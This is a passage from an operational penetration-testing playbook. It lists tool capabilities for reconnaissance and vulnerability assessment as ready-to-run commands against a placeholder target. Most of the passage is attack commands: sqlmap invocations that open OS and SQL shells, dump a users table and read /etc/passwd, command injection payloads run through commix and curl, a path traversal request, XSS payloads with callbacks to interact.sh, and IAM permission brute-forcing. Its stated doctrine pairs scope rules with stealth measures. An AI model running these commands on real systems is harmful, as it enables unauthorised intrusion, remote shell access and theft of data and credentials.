**Inputs:** `target_url`, `wordlist_path`, `api_spec_file`, `auth_token`, `output_file`
**Tools:** kiterunner, ffuf, gobuster, arjun, wfuzz, feroxbuster

```bash
# kiterunner — API endpoint brute-force
kr scan https://target.com -w /path/to/routes-large.kite -x 10 -j 100 --fail-status-codes 404 -o kr_out.txt
kr scan https://target.com -A=apiroutes-210328:20000 -x 10 -o kr_api.txt
kr brute https://target.com -w /path/to/wordlist.txt -x 10 -o kr_brute.txt

# ffuf — fast web fuzzer for API paths
ffuf -u https://target.com/api/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,201,301,302,403 -o ffuf_api.json -of json
ffuf -u https://target.com/api/v1/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc all -fc 404 -o ffuf_v1.json -of json
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/swagger.txt -mc 200 -o ffuf_swagger.json -of json

# gobuster — directory/file brute-force for APIs
gobuster dir -u https://target.com/api/ -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster_api.txt -b 404
gobuster dir -u https://target.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt -t 50 -o gobuster_endpoints.txt

# arjun — HTTP parameter discovery
arjun -u https://target.com/api/endpoint -m GET -oJ arjun_get.json
arjun -u https://target.com/api/endpoint -m POST -oJ arjun_post.json
arjun -i urls.txt -oJ arjun_bulk.json -t 10

# feroxbuster — recursive content discovery
feroxbuster -u https://target.com/api/ -w /usr/share/wordlists/dirb/common.txt -t 50 -d 3 -o ferox_api.txt --json
feroxbuster -u https://target.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -x json,xml -C 404 -o ferox_ext.txt
```

---

### 6. VIRTUAL HOSTING
**Inputs:** `target_ip`, `target_domain`, `vhost_wordlist`, `output_file`, `port`
**Tools:** gobuster, ffuf, wfuzz, nmap, curl, httpx

```bash
# gobuster — virtual host brute-force
gobuster vhost -u https://target.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -o gobuster_vhost.txt
gobuster vhost -u http://192.168.1.1 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 50 --append-domain -o gobuster_vhost2.txt

# ffuf — virtual host fuzzing
ffuf -u https://target.com -H "Host: FUZZ.target.com" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200 -fs 1234 -o ffuf_vhost.json -of json
ffuf -u http://192.168.1.1 -H "Host: FUZZ.target.com" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -fc 404 -fs 0 -o ffuf_vhost2.json -of json

# wfuzz — virtual host enumeration
wfuzz -u https://target.com -H "Host: FUZZ.target.com" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hc 404 --hl 0 -o wfuzz_vhost.txt
wfuzz -u http://192.168.1.1 -H "Host: FUZZ.target.com" -w /usr/share/wordlists/dns/subdomains.txt --hc 302 -o wfuzz_vhost2.txt

# nmap — HTTP host header scanning
nmap --script http-vhosts -p 80,443 target.com -oN nmap_vhosts.txt
nmap --script hostmap-crtsh -p 443 target.com -oN nmap_hostmap.txt

# curl — manual vhost validation
curl -sk -H "Host: dev.target.com" https://192.168.1.1 -o /dev/null -w "%{http_code} %{size_download}\n"
for sub in dev staging admin test api; do curl -sk -H "Host: $sub.target.com" https://192.168.1.1 -o /dev/null -w "$sub: %{http_code} %{size_download}\n"; done
```

---

### 7. DIRECTORY BRUTEFORCING
**Inputs:** `target_url`, `wordlist_path`, `extensions`, `threads`, `output_file`
**Tools:** feroxbuster, gobuster, ffuf, dirsearch, dirb, wfuzz

```bash
# feroxbuster — recursive directory brute-force
feroxbuster -u https://target.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100 -d 4 -x php,asp,aspx,jsp,html,js,txt,bak -C 404 -o ferox_dirs.txt --json
feroxbuster -u https://target.com -w /usr/share/wordlists/dirb/big.txt -t 50 -d 3 --smart --auto-tune -o ferox_smart.txt
feroxbuster -u https://target.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,bak,old,zip -n -o ferox_flat.txt

# gobuster — fast directory/file brute-force
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,asp,aspx,jsp,html,txt,bak,zip,sql -o gobuster_dirs.txt -b 404 --wildcard
gobuster dir -u https://target.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -t 50 -o gobuster_files.txt

# ffuf — content discovery with filtering
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -mc all -fc 404 -e .php,.asp,.aspx,.jsp,.html,.txt,.bak,.zip,.sql -t 100 -o ffuf_dirs.json -of json
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -mc 200,301,302,403 -recursion -recursion-depth 3 -o ffuf_recursive.json -of json

# dirsearch — advanced web path scanner
dirsearch -u https://target.com -w /usr/share/wordlists/dirb/common.txt -e php,asp,aspx,jsp,html,txt -t 50 -o dirsearch_out.txt --format json
dirsearch -u https://target.com -r -R 3 -e php,html -t 30 -o dirsearch_recursive.txt

# dirb — classic directory scanner
dirb https://target.com /usr/share/wordlists/dirb/big.txt -o dirb_out.txt -N 404
dirb https://target.com /usr/share/wordlists/dirb/common.txt -X .php,.bak,.old -o dirb_ext.txt

# wfuzz — web fuzzer for directory discovery
wfuzz -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt --hc 404 -t 50 -o wfuzz_dirs.txt
```

---

### 8. PARAMETER DISCOVERY
**Inputs:** `target_url`, `wordlist_path`, `http_method`, `auth_headers`, `output_file`
**Tools:** arjun, paramspider, ffuf, x8, gau, unfurl

```bash
# arjun — HTTP parameter brute-force
arjun -u https://target.com/page -m GET -oJ arjun_get.json -t 10
arjun -u https://target.com/api/endpoint -m POST -oJ arjun_post.json -t 10
arjun -u https://target.com/page -m GET POST -oJ arjun_multi.json --headers "Authorization: Bearer TOKEN"
arjun -i urls.txt -oJ arjun_bulk.json -t 15 --stable

# paramspider — web archive parameter mining
paramspider -d target.com -o paramspider_out.txt --exclude png,jpg,gif,css,woff,svg
paramspider -l domains.txt -o paramspider_bulk.txt

# ffuf — parameter fuzzing
ffuf -u "https://target.com/page?FUZZ=test" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fc 404 -fs 1234 -o ffuf_params.json -of json
ffuf -u https://target.com/api/endpoint -X POST -d "FUZZ=test" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fc 404 -o ffuf_post_params.json -of json

# x8 — hidden parameter discovery
x8 -u https://target.com/page -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -o x8_params.json
x8 -u https://target.com/api/endpoint -X POST -w params.txt -o x8_post.json

# gau + unfurl — extract parameters from historical URLs
gau target.com | unfurl keys | sort -u > param_names.txt
gau target.com | unfurl format "%s://%d%p?%q" | sort -u > parameterized_urls.txt
gau target.com | grep "=" | qsreplace "FUZZ" | sort -u > fuzzable_urls.txt
```

---

### 9. CLOUD EXPOSURE
**Inputs:** `target_domain`, `cloud_provider`, `region_list`, `keywords`, `output_file`
**Tools:** prowler, scoutsuite, cloudsplaining, pmapper, awscli, enumerate-iam

```bash
# prowler — AWS/Azure/GCP security assessment
prowler aws --severity critical high -M json-ocsf -o prowler_aws/
prowler aws -c s3_bucket_public_access ec2_security_group_open -o prowler_checks/
prowler azure --severity critical high -M json -o prowler_azure/
prowler gcp --severity critical high -M json -o prowler_gcp/

# scoutsuite — multi-cloud security auditing (CLI)
scout aws --force --no-browser --report-dir scoutsuite_aws/
scout azure --cli --force --no-browser --report-dir scoutsuite_azure/
scout gcp --force --no-browser --report-dir scoutsuite_gcp/

# awscli — direct AWS exposure checks
aws s3 ls --no-sign-request 2>/dev/null
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request
aws ec2 describe-snapshots --owner-ids self --query 'Snapshots[?Public]' --output json
aws ec2 describe-instances --filters "Name=ip-address,Values=target_ip" --output json

# enumerate-iam — brute-force IAM permissions
python3 enumerate-iam.py --access-key AKIA... --secret-key SECRET --output enumerate_iam.json

# pmapper — AWS IAM privilege escalation paths
pmapper graph create
pmapper query "who can do s3:GetObject with *"
pmapper query "who can do iam:CreateUser with *"
pmapper visualize --output pmapper_graph.svg
```

---

### 10. TLS ANALYSIS
**Inputs:** `target_host`, `target_port`, `cert_file`, `output_file`, `protocol_version`
**Tools:** testssl.sh, sslscan, sslyze, openssl, tlsx, nmap

```bash
# testssl.sh — comprehensive TLS/SSL testing
testssl.sh --full https://target.com | tee testssl_full.txt
testssl.sh --severity HIGH --json-pretty testssl.json https://target.com:443
testssl.sh --heartbleed --ccs --ticketbleed --robot --crime --breach --poodle --sweet32 https://target.com
testssl.sh --parallel --file hosts.txt --json-pretty testssl_bulk.json

# sslscan — SSL/TLS cipher and vulnerability scanner
sslscan --show-certificate --no-colour target.com:443 > sslscan_out.txt
sslscan --xml=sslscan.xml target.com:443
sslscan --show-client-cas --show-sigs target.com:443

# sslyze — fast TLS configuration analyzer
sslyze target.com --json_out sslyze.json
sslyze target.com --heartbleed --openssl_ccs --robot --certinfo
sslyze --targets_in hosts.txt --json_out sslyze_bulk.json

# openssl — manual TLS inspection
openssl s_client -connect target.com:443 -servername target.com < /dev/null 2>/dev/null | openssl x509 -noout -text
openssl s_client -connect target.com:443 -tls1 2>/dev/null
openssl s_client -connect target.com:443 -tls1_1 2>/dev/null
openssl s_client -connect target.com:443 -cipher 'NULL:eNULL:aNULL' 2>&1 | head -5

# tlsx — fast TLS data extraction
echo target.com | tlsx -san -cn -so -json -o tlsx_analysis.json
tlsx -l hosts.txt -p 443,8443,9443 -san -cn -expired -mismatched -self-signed -json -o tlsx_issues.json

# nmap — TLS/SSL NSE scripts
nmap --script ssl-enum-ciphers -p 443 target.com -oN nmap_ciphers.txt
nmap --script ssl-heartbleed,ssl-poodle,ssl-ccs-injection -p 443 target.com -oN nmap_ssl_vulns.txt
```

---

### 11. CONTENT DISCOVERY
**Inputs:** `target_url`, `wordlist_path`, `extensions`, `status_codes`, `output_file`
**Tools:** feroxbuster, ffuf, gobuster, meg, hakcheckurl, httpx

```bash
# feroxbuster — intelligent content discovery
feroxbuster -u https://target.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -x php,asp,aspx,jsp,html,txt,bak,old,zip,tar.gz,sql,json,xml,config,env,log -t 100 -d 3 -o ferox_content.txt --json
feroxbuster -u https://target.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --collect-words --collect-backups -o ferox_collect.txt

# ffuf — targeted content discovery
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -mc 200,301,302,403 -o ffuf_files.json -of json -t 100
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -mc 200,403 -o ffuf_quickhits.json -of json
ffuf -u https://target.com/.FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/dot-files.txt -mc 200 -o ffuf_dotfiles.json -of json

# gobuster — backup and config file discovery
gobuster dir -u https://target.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -x bak,old,zip,tar,gz,sql,swp,~,config,env,ini,log -t 50 -o gobuster_backup.txt
gobuster dir -u https://target.com -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -s 200,204,301,302,307,401,403 -t 50 -o gobuster_all.txt

# meg — fetch many paths for many hosts
meg -d 10 -c 50 /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt hosts.txt meg_out/
meg / hosts.txt meg_root/ -d 10

# httpx — probe discovered content
cat discovered_paths.txt | httpx -mc 200 -title -cl -content-type -o httpx_content.txt -json
```

---

### 12. ENDPOINT MAPPING
**Inputs:** `target_url`, `javascript_files`, `api_spec`, `output_file`, `crawl_depth`
**Tools:** katana, linkfinder, jsluice, secretfinder, gospider, gau

```bash
# katana — JavaScript-aware endpoint extraction
katana -u https://target.com -d 5 -jc -kf -ef css,png,jpg,gif,woff -o katana_endpoints.txt
katana -u https://target.com -d 3 -jc -aff -xhr -hl -json -o katana_xhr.json
katana -list urls.txt -d 3 -jc -kf -c 50 -p 10 -o katana_bulk.txt

# linkfinder — JavaScript endpoint extraction
linkfinder -i https://target.com -d -o cli > linkfinder_endpoints.txt
linkfinder -i https://target.com/app.js -o cli > linkfinder_js.txt
find js_files/ -name "*.js" -exec linkfinder -i {} -o cli \; > linkfinder_all.txt

# jsluice — JavaScript URL and secret extraction
cat app.js | jsluice urls > jsluice_urls.txt
cat app.js | jsluice secrets > jsluice_secrets.txt
find js_files/ -name "*.js" -exec cat {} \; | jsluice urls | sort -u > jsluice_all_urls.txt

# secretfinder — secrets in JavaScript files
secretfinder -i https://target.com/app.js -o cli > secretfinder_out.txt
secretfinder -i https://target.com -e -o cli > secretfinder_deep.txt

# gospider — endpoint extraction via spidering
gospider -s https://target.com -d 3 -c 10 --js --sitemap --robots -o gospider_endpoints/
gospider -S urls.txt -d 2 -c 10 --include-subs --other-source -o gospider_bulk/

# gau — historical endpoint mining
gau target.com | grep -E '\.(js|json|xml|php|asp|aspx|jsp)$' | sort -u > gau_endpoints.txt
gau target.com | grep -iE '(api|graphql|rest|v[0-9]|endpoint)' | sort -u > gau_api_endpoints.txt
```

---

### 13. CONTAINER EXPOSURE
**Inputs:** `target_ip`, `target_url`, `registry_url`, `port_range`, `output_file`
**Tools:** nmap, trivy, grype, curl, docker (CLI), nuclei

```bash
# nmap — container and orchestration port detection
nmap -sV -p 2375,2376,2377,4243,5000,8443,10250,10255,6443,9443,30000-32767 target.com -oA nmap_containers
nmap --script docker-version -p 2375,2376 target.com -oN nmap_docker.txt
nmap -sV -p 10250,10255 target.com --script kubelet-* -oN nmap_kubelet.txt

# trivy — container image vulnerability scanning
trivy image target-registry.com/app:latest --severity HIGH,CRITICAL -f json -o trivy_image.json
trivy image --list-all-pkgs target-registry.com/app:latest -f json -o trivy_full.json
trivy repo https://github.com/target/app.git -f json -o trivy_repo.json

# grype — container image vulnerability scanning
grype target-registry.com/app:latest -o json > grype_out.json
grype target-registry.com/app:latest --only-fixed -o table > grype_fixable.txt

# curl — Docker/Kubernetes API probing
curl -sk https://target.com:2376/version
curl -sk https://target.com:2376/containers/json
curl -sk https://target.com:10250/pods
curl -sk https://target.com:10255/pods
curl -sk https://target.com:6443/api/v1/namespaces/default/pods --header "Authorization: Bearer $TOKEN"
curl -sk https://target.com:5000/v2/_catalog

# nuclei — container/orchestration vulnerability templates
nuclei -u https://target.com -tags kubernetes,docker,k8s -o nuclei_containers.txt -json
nuclei -u https://target.com:2376 -t /root/nuclei-templates/misconfiguration/docker/ -o nuclei_docker.txt
```

---

### 14. DATABASE EXPOSURE
**Inputs:** `target_ip`, `port`, `db_type`, `credential_list`, `output_file`
**Tools:** nmap, nuclei, mysql, psql, redis-cli, mongo

```bash
# nmap — database service detection and enumeration
nmap -sV -p 3306,5432,1433,1521,27017,6379,9200,5984,8529,11211 target.com -oA nmap_db
nmap --script mysql-info,mysql-enum,mysql-databases -p 3306 target.com -oN nmap_mysql.txt
nmap --script ms-sql-info,ms-sql-config,ms-sql-ntlm-info -p 1433 target.com -oN nmap_mssql.txt
nmap --script mongodb-info,mongodb-databases -p 27017 target.com -oN nmap_mongo.txt
nmap --script redis-info -p 6379 target.com -oN nmap_redis.txt
nmap --script pgsql-brute -p 5432 target.com -oN nmap_pgsql.txt

# nuclei — database exposure templates
nuclei -u target.com -tags database,db -o nuclei_db.txt -json
nuclei -u target.com:9200 -tags elasticsearch -o nuclei_elastic.txt

# mysql — MySQL connection testing
mysql -h target.com -u root --connect-timeout=5 -e "SHOW DATABASES;" 2>/dev/null
mysql -h target.com -u root -p'' -e "SELECT user, host FROM mysql.user;" 2>/dev/null

# psql — PostgreSQL connection testing
psql -h target.com -U postgres -c "SELECT datname FROM pg_database;" 2>/dev/null
PGPASSWORD='' psql -h target.com -U postgres -c "\du" 2>/dev/null

# redis-cli — Redis access testing
redis-cli -h target.com info server
redis-cli -h target.com config get "*"
redis-cli -h target.com keys "*" 2>/dev/null | head -50

# mongo — MongoDB access testing
mongosh --host target.com --eval "db.adminCommand('listDatabases')" --quiet 2>/dev/null
mongosh --host target.com --eval "db.getCollectionNames()" --quiet 2>/dev/null
```

---

### 15. NETWORK PROFILING
**Inputs:** `target_network`, `interface`, `cidr_range`, `output_file`, `scan_type`
**Tools:** nmap, p0f, netcat, tcpdump, responder, nbtscan

```bash
# nmap — network service and OS profiling
nmap -sV -sC -O -A 192.168.1.0/24 -oA nmap_profile
nmap -sV --version-all -O --osscan-guess -p- target.com -oA nmap_deep_profile
nmap --script smb-os-discovery,nbstat -p 445,139 192.168.1.0/24 -oN nmap_smb_os.txt
nmap --script broadcast-dhcp-discover -oN nmap_dhcp.txt

# p0f — passive OS fingerprinting
p0f -i eth0 -o p0f_out.txt -l
p0f -r capture.pcap -o p0f_pcap.txt

# tcpdump — passive network traffic analysis
tcpdump -i eth0 -nn -c 10000 -w network_capture.pcap
tcpdump -i eth0 -nn 'port 53' -c 5000 -w dns_traffic.pcap
tcpdump -i eth0 -nn 'tcp[tcpflags] & (tcp-syn) != 0' -c 5000 > syn_traffic.txt

# responder — LLMNR/NBT-NS/MDNS passive analysis
responder -I eth0 -A > responder_analyze.txt

# nbtscan — NetBIOS name scanning
nbtscan 192.168.1.0/24 > nbtscan_out.txt
nbtscan -r 192.168.1.0/24 > nbtscan_resolved.txt

# netcat — targeted port probing
nc -zvn target.com 1-1000 2>&1 | grep succeeded
nc -zvnw 3 target.com 22 80 443 445 3389 2>&1
```

---

### 16. ASSET CORRELATION
**Inputs:** `recon_output_dir`, `target_scope`, `output_file`, `merge_strategy`
**Tools:** httpx, dnsx, jq, anew, sort, comm

```bash
# httpx — validate and enrich discovered assets
cat all_hosts.txt | httpx -title -status-code -tech-detect -ip -cname -cdn -json -o correlated_assets.json
cat all_urls.txt | httpx -mc 200,301,302 -cl -hash sha256 -json -o live_assets.json

# dnsx — resolve and validate DNS entries
dnsx -l all_domains.txt -a -aaaa -cname -mx -ns -resp -json -o dns_correlation.json
dnsx -l all_domains.txt -a -resp-only -silent | sort -u > resolved_ips.txt

# jq — correlate and merge structured outputs
jq -s '[.[] | {host: .host, ip: .ip, tech: .tech, title: .title}]' httpx_*.json > merged_assets.json
jq -r '.[] | select(.tech | length > 0) | "\(.host) \(.tech | join(", "))"' correlated_assets.json > tech_map.txt
jq -r '.[].host' correlated_assets.json | sort -u > unique_hosts.txt

# anew — append unique entries across datasets
cat recon_source1.txt recon_source2.txt recon_source3.txt | anew all_unique.txt
cat new_findings.txt | anew master_scope.txt

# sort + comm — set operations on asset lists
sort -u amass.txt subfinder.txt puredns.txt > all_subs_sorted.txt
comm -12 <(sort ips_from_dns.txt) <(sort ips_from_scan.txt) > overlapping_ips.txt
comm -23 <(sort all_subs.txt) <(sort resolved_subs.txt) > unresolved_subs.txt

# custom pipeline — full asset correlation
cat subs_*.txt | sort -u | dnsx -a -resp-only -silent | sort -u > all_ips.txt && naabu -l all_ips.txt -top-ports 100 -silent | httpx -title -td -json -o final_inventory.json
```

---

### Phase Rule — ATTACK SURFACE MAPPING

> **Operational doctrine.** Attack surface mapping converts raw reconnaissance into an actionable target inventory. Every capability maps a distinct dimension of exposure. Execution follows this protocol:
>
> 1. **Input validation** — all inputs originate from Phase 01 outputs or operator-supplied scope. Raw IPs, CIDRs, and domains are validated against engagement rules of engagement before scanning begins.
> 2. **Scan orchestration** — port scanning precedes service fingerprinting. Service fingerprinting precedes content discovery. This dependency chain is enforced — no capability runs before its prerequisites complete.
> 3. **Rate and stealth control** — masscan and zmap rates are capped per engagement profile. SYN scans use randomized source ports. DNS resolution uses trusted upstream resolvers. HTTP requests rotate User-Agent strings.
> 4. **Protocol completeness** — TCP and UDP are both scanned. IPv4 and IPv6 are both probed where in scope. TLS versions are enumerated exhaustively. Non-standard ports are not assumed safe.
> 5. **Deduplication and enrichment** — discovered hosts, ports, and services are deduplicated across tools. Each asset is enriched with CDN status, WAF presence, technology stack, and TLS configuration before advancing.
> 6. **Evidence capture** — every scan produces timestamped output files (JSON preferred). Scan parameters, tool versions, and runtime are logged. Screenshots supplement text-based discovery for web assets.
> 7. **Scope boundary enforcement** — out-of-scope assets discovered incidentally are logged but not probed further. Scope violations trigger immediate abort of the offending capability.

---

## 03. VULNERABILITY ASSESSMENT

**Minimum capability count: 16**

### 1. VULNERABILITY SCANNING
**Inputs:** `target_ip`, `target_url`, `port_list`, `template_path`, `output_file`
**Tools:** nuclei, nmap, nikto, openvas-cli (gvm-cli), wapiti, zap-cli

```bash
# nuclei — template-based vulnerability scanning
nuclei -u https://target.com -severity critical,high -o nuclei_critical.txt -json
nuclei -l urls.txt -tags cve -severity critical,high,medium -o nuclei_cves.txt -json -rate-limit 100
nuclei -u https://target.com -t /root/nuclei-templates/ -severity critical,high -o nuclei_full.txt -json
nuclei -l urls.txt -tags oast -interactsh-server interact.sh -o nuclei_oast.txt -json
nuclei -u https://target.com -w /root/nuclei-templates/workflows/ -o nuclei_workflow.txt

# nmap — NSE vulnerability scripts
nmap --script vuln -p 80,443,8080 target.com -oA nmap_vuln
nmap --script "default and vuln" -sV -p- target.com -oA nmap_default_vuln
nmap --script exploit -p 445 target.com -oN nmap_exploit.txt
nmap --script "smb-vuln-*" -p 445 target.com -oN nmap_smb_vuln.txt

# nikto — web server vulnerability scanner
nikto -h https://target.com -o nikto_out.json -Format json -Tuning x6789ab
nikto -h https://target.com -p 8080 -ssl -o nikto_ssl.txt -maxtime 3600
nikto -h hosts.txt -o nikto_bulk.txt -Format txt

# wapiti — web application vulnerability scanner
wapiti -u https://target.com --scope domain -f json -o wapiti_scan.json -m all
wapiti -u https://target.com --scope page -m xxe,exec,sql,xss -f json -o wapiti_focused.json

# zap-cli — OWASP ZAP command-line interface
zap-cli quick-scan -s xss,sqli -r https://target.com -o zap_quick.html
zap-cli active-scan https://target.com
zap-cli report -o zap_report.html -f html
```

---

### 2. WEB ASSESSMENT
**Inputs:** `target_url`, `crawl_scope`, `auth_config`, `proxy`, `output_file`
**Tools:** nikto, wapiti, nuclei, zap-cli, whatweb, curl

```bash
# nikto — comprehensive web server assessment
nikto -h https://target.com -C all -o nikto_full.json -Format json
nikto -h https://target.com -Tuning 123456789abc -mutate 1,2,3 -o nikto_deep.txt

# wapiti — full web application audit
wapiti -u https://target.com --scope domain --flush-session -m all -f json -o wapiti_full.json --max-scan-time 7200
wapiti -u https://target.com --auth-cred "user%password" --auth-type basic -m all -f json -o wapiti_auth.json

# nuclei — web-specific templates
nuclei -u https://target.com -tags web,misconfig,exposure -severity critical,high,medium -o nuclei_web.txt -json
nuclei -u https://target.com -t /root/nuclei-templates/exposures/ -o nuclei_exposures.txt -json
nuclei -u https://target.com -t /root/nuclei-templates/misconfiguration/ -o nuclei_misconfig.txt

# curl — manual header and security assessment
curl -sIk https://target.com | grep -iE '(x-frame|x-xss|x-content|content-security|strict-transport|referrer-policy|permissions-policy|feature-policy)'
curl -sk "https://target.com/../../etc/passwd" -o /dev/null -w "%{http_code}"
curl -sk https://target.com -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -D headers_bypass.txt -o body_bypass.txt

# whatweb — technology and misconfiguration detection
whatweb -v -a 4 https://target.com --log-json whatweb_assess.json
```

---

### 3. SQL INJECTION
**Inputs:** `target_url`, `parameter`, `cookie`, `dbms_type`, `output_file`
**Tools:** sqlmap, ghauri, nosqlmap, jsql-injection, nmap

```bash
# sqlmap — automated SQL injection exploitation
sqlmap -u "https://target.com/page?id=1" --batch --dbs --random-agent -o
sqlmap -u "https://target.com/page?id=1" --batch --tables -D targetdb --random-agent
sqlmap -u "https://target.com/page?id=1" --batch --dump -D targetdb -T users --random-agent
sqlmap -u "https://target.com/page?id=1" --batch --os-shell --random-agent
sqlmap -u "https://target.com/page?id=1" --batch --level 5 --risk 3 --tamper=space2comment,between --random-agent
sqlmap -r request.txt --batch --dbs --random-agent --technique=BEUSTQ
sqlmap -u "https://target.com/page" --data="user=test&pass=test" --batch --dbs --random-agent
sqlmap -u "https://target.com/page?id=1" --batch --file-read="/etc/passwd" --random-agent
sqlmap --crawl=3 -u "https://target.com/" --batch --forms --dbs --random-agent
sqlmap -u "https://target.com/page?id=1" --batch --sql-shell --random-agent

# ghauri — advanced SQL injection detection
ghauri -u "https://target.com/page?id=1" --dbs --batch
ghauri -u "https://target.com/page?id=1" --current-db --batch --level 3

# nosqlmap — NoSQL injection testing
nosqlmap -u https://target.com/api/login -p user,pass

# nmap — SQL injection NSE scripts
nmap --script http-sql-injection -p 80,443 target.com -oN nmap_sqli.txt
```

---

### 4. XSS DETECTION
**Inputs:** `target_url`, `parameter`, `payload_list`, `blind_callback`, `output_file`
**Tools:** dalfox, kxss, xsstrike, gxss, nuclei, ffuf

```bash
# dalfox — advanced XSS scanning
dalfox url "https://target.com/page?q=test" -o dalfox_out.txt
dalfox url "https://target.com/page?q=test" --blind https://your.interact.sh -o dalfox_blind.txt
dalfox file urls_with_params.txt -o dalfox_bulk.txt -w 50
dalfox url "https://target.com/page?q=test" --custom-payload xss_payloads.txt -o dalfox_custom.txt
dalfox url "https://target.com/page?q=test" --deep-domxss -o dalfox_dom.txt

# kxss — parameter reflection checking
cat urls_with_params.txt | kxss > kxss_reflected.txt
echo "https://target.com/page?q=test" | kxss

# xsstrike — intelligent XSS detection
xsstrike -u "https://target.com/page?q=test" --crawl -l 3
xsstrike -u "https://target.com/page?q=test" --blind --skip-dom
xsstrike -u "https://target.com/page?q=test" --fuzzer

# gxss — inject XSS payloads into URL parameters
cat urls_with_params.txt | gxss -p "test<script>alert(1)</script>" > gxss_out.txt

# nuclei — XSS-specific templates
nuclei -l urls.txt -tags xss -o nuclei_xss.txt -json
nuclei -l urls.txt -t /root/nuclei-templates/vulnerabilities/xss/ -o nuclei_xss_deep.txt

# ffuf — XSS payload fuzzing
ffuf -u "https://target.com/page?q=FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/XSS/XSS-Jhaddix.txt -mc all -fr "not found" -o ffuf_xss.json -of json
```

---

### 5. COMMAND INJECTION
**Inputs:** `target_url`, `parameter`, `os_type`, `technique`, `output_file`
**Tools:** commix, nuclei, ffuf, curl, wapiti

```bash
# commix — automated command injection exploitation
commix -u "https://target.com/page?cmd=test" --batch --all
commix -u "https://target.com/page?cmd=test" --batch --os-cmd="id" --technique=classic
commix -u "https://target.com/page?cmd=test" --batch --os-cmd="cat /etc/passwd" --technique=time-based
commix -u "https://target.com/page" --data="host=test" --batch --all
commix -r request.txt --batch --all --level 3
commix -u "https://target.com/page?ip=test" --batch --os-cmd="whoami" --prefix=";" --suffix=""

# nuclei — command injection templates
nuclei -u https://target.com -tags rce,cmdi -o nuclei_rce.txt -json
nuclei -l urls.txt -tags rce -severity critical,high -o nuclei_rce_bulk.txt

# ffuf — command injection payload fuzzing
ffuf -u "https://target.com/page?cmd=FUZZ" -w /usr/share/wordlists/seclists/Fuzzing/command-injection-commix.txt -mc all -fr "not found" -o ffuf_cmdi.json -of json

# curl — manual command injection testing
curl -sk "https://target.com/page?ip=127.0.0.1;id"
curl -sk "https://target.com/page?ip=127.0.0.1|whoami"
curl -sk "https://target.com/page" -d "host=127.0.0.1%0aid"

# wapiti — command injection module
wapiti -u https://target.com --scope page -m exec -f json -o wapiti_cmdi.json
```

---

### 6. DEPENDENCY AUDITING
**Inputs:** `project_directory`, `manifest_file`, `image_name`, `repo_url`, `output_file`
**Tools:** trivy, grype, osv-scanner, semgrep, npm (audit), pip-audit

```bash
# trivy — comprehensive dependency scanning
trivy fs /path/to/project --severity HIGH,CRITICAL -f json -o trivy_deps.json
trivy fs /path/to/project --list-all-pkgs -f json -o trivy_full.json
trivy image target-app:latest --severity HIGH,CRITICAL -f json -o trivy_image.json
trivy repo https://github.com/target/app.git -f json -o trivy_repo.json
trivy sbom /path/to/project -f json -o trivy_sbom.json

# grype — vulnerability scanning for containers and filesystems
grype dir:/path/to/project -o json > grype_deps.json
grype target-app:latest -o json --only-fixed > grype_fixable.json
grype sbom:sbom.json -o json > grype_sbom.json

# osv-scanner — Open Source Vulnerability scanner
osv-scanner -r /path/to/project --json > osv_scan.json
osv-scanner --lockfile=package-lock.json --json > osv_npm.json
osv-scanner --sbom=sbom.spdx.json --json > osv_sbom.json

# semgrep — static analysis for dependency patterns
semgrep scan --config=auto /path/to/project --json -o semgrep_deps.json
semgrep scan --config=p/supply-chain /path/to/project --json -o semgrep_supply.json

# pip-audit — Python dependency auditing
pip-audit -r requirements.txt -f json -o pip_audit.json
pip-audit --desc -f json -o pip_audit_desc.json

# npm audit — Node.js dependency auditing
npm audit --json > npm_audit.json
npm audit --production --json > npm_audit_prod.json
```

---

### 7. CONFIGURATION AUDITING
**Inputs:** `target_host`, `config_path`, `policy_file`, `output_file`, `audit_type`
**Tools:** lynis, linpeas, nuclei, nmap, testssl.sh, prowler

```bash
# lynis — system security auditing
lynis audit system --quick --no-colors > lynis_quick.txt
lynis audit system --pentest --no-colors > lynis_pentest.txt
lynis audit system --profile /etc/lynis/custom.prf --no-colors > lynis_custom.txt
